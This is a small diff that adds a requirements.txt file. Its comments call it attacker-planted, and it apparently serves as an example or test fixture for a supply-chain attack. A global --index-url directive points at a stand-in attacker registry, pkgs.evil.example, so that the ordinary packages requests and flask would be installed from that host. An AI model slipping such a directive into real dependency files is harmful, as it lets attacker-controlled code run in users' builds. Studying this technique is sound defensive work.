@@ -1,0 +1,6 @@
+# Attacker-planted requirements file: a top-level index directive silently
+# redirects EVERY package (even legit-named ones) to the attacker registry.
+# pip honors --index-url in a requirements file as a global option.
+--index-url https://pkgs.evil.example/simple
+requests>=2.31
+flask==3.0.2
